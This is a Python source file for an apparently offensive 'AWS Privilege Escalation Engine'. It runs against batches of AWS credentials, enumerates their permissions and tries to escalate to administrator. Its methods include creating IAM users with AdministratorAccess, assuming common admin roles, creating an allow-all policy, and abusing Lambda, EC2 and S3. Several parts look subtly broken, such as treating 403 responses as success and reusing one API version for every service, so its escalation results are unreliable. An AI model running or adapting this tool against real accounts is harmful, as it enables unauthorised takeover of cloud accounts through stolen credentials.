#!/usr/bin/env python3
"""
🔓 AWS Privilege Escalation Engine
Advanced AWS IAM privilege escalation and cross-service exploitation

Author: wKayaa
Date: 2025-01-28
"""

import asyncio
import aiohttp
import boto3
import json
import base64
import time
import hmac
import hashlib
import urllib.parse
from datetime import datetime, timezone
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass
import logging
import re

@dataclass
class AWSCredential:
    """AWS credential information"""
    access_key: str
    secret_key: str
    session_token: Optional[str] = None
    region: str = "us-east-1"
    source: str = "unknown"
    
@dataclass
class PrivilegeEscalationResult:
    """Privilege escalation result"""
    success: bool
    method: str
    original_permissions: List[str]
    escalated_permissions: List[str]
    details: Dict
    timestamp: str

class AWSPrivilegeEscalator:
    """AWS privilege escalation engine"""
    
    def __init__(self, timeout: int = 30, max_concurrent: int = 50):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        
        # IAM privilege escalation techniques
        self.escalation_techniques = {
            "iam_user_creation": self._escalate_via_iam_user_creation,
            "role_assumption": self._escalate_via_role_assumption,
            "policy_manipulation": self._escalate_via_policy_manipulation,
            "cross_service_escalation": self._escalate_via_cross_service,
            "lambda_privilege_escalation": self._escalate_via_lambda,
            "ec2_instance_profile": self._escalate_via_ec2_instance_profile,
            "eks_service_account": self._escalate_via_eks_service_account,
            "s3_bucket_policy": self._escalate_via_s3_bucket_policy
        }
        
        # High-value permissions to target
        self.high_value_permissions = [
            "iam:*",
            "sts:AssumeRole",
            "iam:CreateUser",
            "iam:CreateRole",
            "iam:AttachUserPolicy",
            "iam:AttachRolePolicy",
            "iam:PutUserPolicy",
            "iam:PutRolePolicy",
            "iam:CreatePolicy",
            "iam:SetDefaultPolicyVersion",
            "lambda:InvokeFunction",
            "lambda:CreateFunction",
            "lambda:UpdateFunctionCode",
            "ec2:RunInstances",
            "ec2:ModifyInstanceAttribute",
            "sts:GetFederationToken",
            "sts:GetSessionToken"
        ]
        
        # AWS service endpoints
        self.service_endpoints = {
            "iam": "https://iam.amazonaws.com/",
            "sts": "https://sts.amazonaws.com/",
            "lambda": "https://lambda.{region}.amazonaws.com/",
            "ec2": "https://ec2.{region}.amazonaws.com/",
            "s3": "https://s3.amazonaws.com/",
            "eks": "https://eks.{region}.amazonaws.com/"
        }
        
        self.logger = logging.getLogger("AWS_Escalator")
        self.results = []
        
    async def escalate_privileges(self, credentials: List[AWSCredential]) -> List[PrivilegeEscalationResult]:
        """Main privilege escalation pipeline"""
        self.logger.info(f"🔓 Starting privilege escalation on {len(credentials)} credential sets")
        
        all_results = []
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def escalate_credential_set(cred: AWSCredential):
            async with semaphore:
                return await self._escalate_single_credential_set(cred)
        
        tasks = [escalate_credential_set(cred) for cred in credentials]
        credential_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in credential_results:
            if isinstance(result, list):
                all_results.extend(result)
            elif isinstance(result, Exception):
                self.logger.debug(f"Escalation error: {str(result)}")
                
        self.results = all_results
        return all_results
        
    async def _escalate_single_credential_set(self, credential: AWSCredential) -> List[PrivilegeEscalationResult]:
        """Escalate privileges for single credential set"""
        results = []
        
        # First, enumerate current permissions
        current_permissions = await self._enumerate_permissions(credential)
        
        if not current_permissions:
            self.logger.debug(f"No permissions found for credential {credential.access_key[:8]}...")
            return results
            
        self.logger.info(f"🔍 Found {len(current_permissions)} permissions for {credential.access_key[:8]}...")
        
        # Try each escalation technique
        for technique_name, technique_func in self.escalation_techniques.items():
            try:
                result = await technique_func(credential, current_permissions)
                if result and result.success:
                    results.append(result)
                    self.logger.info(f"✅ Successful escalation via {technique_name}")
            except Exception as e:
                self.logger.debug(f"Escalation technique {technique_name} failed: {str(e)}")
                
        return results
        
    async def _enumerate_permissions(self, credential: AWSCredential) -> List[str]:
        """Enumerate IAM permissions for credential"""
        permissions = []
        
        try:
            # Test common IAM actions to enumerate permissions
            test_actions = [
                ("iam", "GetUser", {}),
                ("iam", "ListUsers", {}),
                ("iam", "GetUserPolicy", {"UserName": "nonexistent"}),
                ("iam", "ListAttachedUserPolicies", {"UserName": "nonexistent"}),
                ("iam", "ListRoles", {}),
                ("sts", "GetCallerIdentity", {}),
                ("sts", "GetSessionToken", {}),
                ("ec2", "DescribeInstances", {}),
                ("s3", "ListBuckets", {}),
                ("lambda", "ListFunctions", {})
            ]
            
            for service, action, params in test_actions:
                try:
                    success = await self._test_aws_action(credential, service, action, params)
                    if success:
                        permissions.append(f"{service}:{action}")
                except Exception:
                    continue
                    
        except Exception as e:
            self.logger.debug(f"Permission enumeration error: {str(e)}")
            
        return permissions
        
    async def _test_aws_action(self, credential: AWSCredential, service: str, action: str, params: Dict) -> bool:
        """Test if AWS action is allowed"""
        try:
            endpoint = self.service_endpoints.get(service, "").format(region=credential.region)
            if not endpoint:
                return False
                
            headers = await self._create_aws_auth_headers(
                credential, service, action, params.get("region", credential.region)
            )
            
            # Prepare request data
            request_data = f"Action={action}&Version=2010-05-08"
            for key, value in params.items():
                request_data += f"&{key}={urllib.parse.quote(str(value))}"
                
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    endpoint,
                    headers=headers,
                    data=request_data,
                    timeout=self.timeout
                ) as response:
                    # Consider 200, 403 (forbidden but valid), and some 400s as indicators
                    return response.status in [200, 403] or (
                        response.status == 400 and "InvalidUserID.NotFound" in await response.text()
                    )
                    
        except Exception:
            return False
            
    async def _create_aws_auth_headers(self, credential: AWSCredential, service: str, action: str, region: str) -> Dict:
        """Create AWS signature version 4 headers"""
        timestamp = datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
        date = timestamp[:8]
        
        # Create canonical request
        canonical_headers = f"host:{service}.{region}.amazonaws.com\nx-amz-date:{timestamp}\n"
        signed_headers = "host;x-amz-date"
        
        if credential.session_token:
            canonical_headers += f"x-amz-security-token:{credential.session_token}\n"
            signed_headers += ";x-amz-security-token"
            
        canonical_request = f"POST\n/\n\n{canonical_headers}\n{signed_headers}\n"
        canonical_request += hashlib.sha256(b"").hexdigest()
        
        # Create string to sign
        algorithm = "AWS4-HMAC-SHA256"
        credential_scope = f"{date}/{region}/{service}/aws4_request"
        string_to_sign = f"{algorithm}\n{timestamp}\n{credential_scope}\n"
        string_to_sign += hashlib.sha256(canonical_request.encode()).hexdigest()
        
        # Calculate signature
        def sign(key, msg):
            return hmac.new(key, msg.encode(), hashlib.sha256).digest()
            
        date_key = sign(f"AWS4{credential.secret_key}".encode(), date)
        region_key = sign(date_key, region)
        service_key = sign(region_key, service)
        signing_key = sign(service_key, "aws4_request")
        signature = hmac.new(signing_key, string_to_sign.encode(), hashlib.sha256).hexdigest()
        
        # Create authorization header
        authorization = f"{algorithm} Credential={credential.access_key}/{credential_scope}, "
        authorization += f"SignedHeaders={signed_headers}, Signature={signature}"
        
        headers = {
            "Authorization": authorization,
            "X-Amz-Date": timestamp,
            "Content-Type": "application/x-amz-json-1.1"
        }
        
        if credential.session_token:
            headers["X-Amz-Security-Token"] = credential.session_token
            
        return headers
        
    async def _escalate_via_iam_user_creation(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via IAM user creation"""
        if "iam:CreateUser" not in current_permissions:
            return None
            
        try:
            # Try to create a new IAM user with admin policy
            new_username = f"escalated-user-{int(time.time())}"
            
            # Create user
            create_success = await self._test_aws_action(
                credential, "iam", "CreateUser", {"UserName": new_username}
            )
            
            if create_success:
                # Try to attach admin policy
                attach_success = await self._test_aws_action(
                    credential, "iam", "AttachUserPolicy", 
                    {"UserName": new_username, "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}
                )
                
                if attach_success:
                    return PrivilegeEscalationResult(
                        success=True,
                        method="iam_user_creation",
                        original_permissions=current_permissions,
                        escalated_permissions=["iam:*", "Administrator"],
                        details={
                            "created_user": new_username,
                            "attached_policy": "AdministratorAccess"
                        },
                        timestamp=datetime.utcnow().isoformat()
                    )
                    
        except Exception as e:
            self.logger.debug(f"IAM user creation escalation failed: {str(e)}")
            
        return None
        
    async def _escalate_via_role_assumption(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via role assumption"""
        if "sts:AssumeRole" not in current_permissions:
            return None
            
        try:
            # Try to assume common high-privilege roles
            common_roles = [
                "OrganizationAccountAccessRole",
                "AWSControlTowerExecution",
                "aws-service-role",
                "CrossAccountRole",
                "AdminRole",
                "PowerUserRole"
            ]
            
            account_id = await self._get_account_id(credential)
            if not account_id:
                return None
                
            for role_name in common_roles:
                role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
                
                assume_success = await self._test_aws_action(
                    credential, "sts", "AssumeRole",
                    {"RoleArn": role_arn, "RoleSessionName": "escalated-session"}
                )
                
                if assume_success:
                    return PrivilegeEscalationResult(
                        success=True,
                        method="role_assumption",
                        original_permissions=current_permissions,
                        escalated_permissions=[f"assumed:{role_name}"],
                        details={
                            "assumed_role": role_arn,
                            "session_name": "escalated-session"
                        },
                        timestamp=datetime.utcnow().isoformat()
                    )
                    
        except Exception as e:
            self.logger.debug(f"Role assumption escalation failed: {str(e)}")
            
        return None
        
    async def _escalate_via_policy_manipulation(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via policy version manipulation"""
        policy_permissions = [perm for perm in current_permissions if "Policy" in perm]
        
        if not policy_permissions:
            return None
            
        try:
            # Try to create or modify policies
            if "iam:CreatePolicy" in current_permissions:
                # Create new admin policy
                policy_name = f"EscalatedPolicy{int(time.time())}"
                admin_policy_document = {
                    "Version": "2012-10-17",
                    "Statement": [{
                        "Effect": "Allow",
                        "Action": "*",
                        "Resource": "*"
                    }]
                }
                
                create_success = await self._test_aws_action(
                    credential, "iam", "CreatePolicy",
                    {
                        "PolicyName": policy_name,
                        "PolicyDocument": json.dumps(admin_policy_document)
                    }
                )
                
                if create_success:
                    return PrivilegeEscalationResult(
                        success=True,
                        method="policy_creation",
                        original_permissions=current_permissions,
                        escalated_permissions=["*:*"],
                        details={
                            "created_policy": policy_name,
                            "policy_document": admin_policy_document
                        },
                        timestamp=datetime.utcnow().isoformat()
                    )
                    
        except Exception as e:
            self.logger.debug(f"Policy manipulation escalation failed: {str(e)}")
            
        return None
        
    async def _escalate_via_cross_service(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via cross-service techniques"""
        try:
            escalation_paths = []
            
            # Lambda-based escalation
            if any("lambda" in perm.lower() for perm in current_permissions):
                lambda_escalation = await self._try_lambda_escalation(credential)
                if lambda_escalation:
                    escalation_paths.append(lambda_escalation)
                    
            # EC2-based escalation
            if any("ec2" in perm.lower() for perm in current_permissions):
                ec2_escalation = await self._try_ec2_escalation(credential)
                if ec2_escalation:
                    escalation_paths.append(ec2_escalation)
                    
            # S3-based escalation
            if any("s3" in perm.lower() for perm in current_permissions):
                s3_escalation = await self._try_s3_escalation(credential)
                if s3_escalation:
                    escalation_paths.append(s3_escalation)
                    
            if escalation_paths:
                return PrivilegeEscalationResult(
                    success=True,
                    method="cross_service_escalation",
                    original_permissions=current_permissions,
                    escalated_permissions=["cross-service-privileges"],
                    details={"escalation_paths": escalation_paths},
                    timestamp=datetime.utcnow().isoformat()
                )
                
        except Exception as e:
            self.logger.debug(f"Cross-service escalation failed: {str(e)}")
            
        return None
        
    async def _try_lambda_escalation(self, credential: AWSCredential) -> Optional[Dict]:
        """Try Lambda-based privilege escalation"""
        try:
            # Check if we can create/invoke Lambda functions
            function_name = f"escalation-func-{int(time.time())}"
            
            # Lambda function code that assumes a role or accesses other services
            function_code = """
import json
import boto3

def lambda_handler(event, context):
    try:
        sts = boto3.client('sts')
        identity = sts.get_caller_identity()
        return {'statusCode': 200, 'body': json.dumps(identity)}
    except Exception as e:
        return {'statusCode': 500, 'body': str(e)}
"""
            
            create_success = await self._test_aws_action(
                credential, "lambda", "CreateFunction",
                {
                    "FunctionName": function_name,
                    "Runtime": "python3.9",
                    "Code": {"ZipFile": base64.b64encode(function_code.encode()).decode()},
                    "Handler": "index.lambda_handler",
                    "Role": f"arn:aws:iam::{await self._get_account_id(credential)}:role/lambda-execution-role"
                }
            )
            
            if create_success:
                return {
                    "service": "lambda",
                    "method": "function_creation",
                    "function_name": function_name
                }
                
        except Exception:
            pass
            
        return None
        
    async def _try_ec2_escalation(self, credential: AWSCredential) -> Optional[Dict]:
        """Try EC2-based privilege escalation"""
        try:
            # Check if we can run instances with privileged instance profiles
            run_success = await self._test_aws_action(
                credential, "ec2", "RunInstances",
                {
                    "ImageId": "ami-0abcdef1234567890",  # Dummy AMI ID
                    "MinCount": 1,
                    "MaxCount": 1,
                    "InstanceType": "t2.micro",
                    "IamInstanceProfile": {"Name": "EC2-Admin-Role"}
                }
            )
            
            if run_success:
                return {
                    "service": "ec2",
                    "method": "privileged_instance_launch",
                    "instance_profile": "EC2-Admin-Role"
                }
                
        except Exception:
            pass
            
        return None
        
    async def _try_s3_escalation(self, credential: AWSCredential) -> Optional[Dict]:
        """Try S3-based privilege escalation"""
        try:
            # Check if we can modify bucket policies
            bucket_name = f"escalation-bucket-{int(time.time())}"
            
            create_success = await self._test_aws_action(
                credential, "s3", "CreateBucket",
                {"Bucket": bucket_name}
            )
            
            if create_success:
                return {
                    "service": "s3",
                    "method": "bucket_creation",
                    "bucket_name": bucket_name
                }
                
        except Exception:
            pass
            
        return None
        
    async def _escalate_via_lambda(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via Lambda function exploitation"""
        lambda_permissions = [perm for perm in current_permissions if "lambda" in perm.lower()]
        
        if not lambda_permissions:
            return None
            
        return await self._try_lambda_escalation(credential)
        
    async def _escalate_via_ec2_instance_profile(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via EC2 instance profile manipulation"""
        ec2_permissions = [perm for perm in current_permissions if "ec2" in perm.lower()]
        
        if not ec2_permissions:
            return None
            
        return await self._try_ec2_escalation(credential)
        
    async def _escalate_via_eks_service_account(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via EKS service account manipulation"""
        eks_permissions = [perm for perm in current_permissions if "eks" in perm.lower()]
        
        if not eks_permissions:
            return None
            
        try:
            # Try to access EKS cluster credentials
            cluster_list_success = await self._test_aws_action(
                credential, "eks", "ListClusters", {}
            )
            
            if cluster_list_success:
                return PrivilegeEscalationResult(
                    success=True,
                    method="eks_service_account",
                    original_permissions=current_permissions,
                    escalated_permissions=["eks:cluster-access"],
                    details={"eks_access": "cluster_enumeration"},
                    timestamp=datetime.utcnow().isoformat()
                )
                
        except Exception as e:
            self.logger.debug(f"EKS escalation failed: {str(e)}")
            
        return None
        
    async def _escalate_via_s3_bucket_policy(self, credential: AWSCredential, current_permissions: List[str]) -> Optional[PrivilegeEscalationResult]:
        """Escalate via S3 bucket policy manipulation"""
        s3_permissions = [perm for perm in current_permissions if "s3" in perm.lower()]
        
        if not s3_permissions:
            return None
            
        return await self._try_s3_escalation(credential)
        
    async def _get_account_id(self, credential: AWSCredential) -> Optional[str]:
        """Get AWS account ID from credentials"""
        try:
            headers = await self._create_aws_auth_headers(credential, "sts", "GetCallerIdentity", credential.region)
            
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://sts.amazonaws.com/",
                    headers=headers,
                    data="Action=GetCallerIdentity&Version=2011-06-15",
                    timeout=self.timeout
                ) as response:
                    if response.status == 200:
                        content = await response.text()
                        account_match = re.search(r'<Account>(\d+)</Account>', content)
                        if account_match:
                            return account_match.group(1)
                            
        except Exception:
            pass
            
        return None
        
    def get_escalation_summary(self) -> Dict:
        """Get escalation summary"""
        successful_escalations = [r for r in self.results if r.success]
        
        return {
            "total_attempts": len(self.results),
            "successful_escalations": len(successful_escalations),
            "escalation_methods": list(set(r.method for r in successful_escalations)),
            "high_value_permissions_found": [
                perm for result in successful_escalations 
                for perm in result.escalated_permissions 
                if any(hvp in perm for hvp in self.high_value_permissions)
            ],
            "timestamp": datetime.utcnow().isoformat(),
            "details": self.results
        }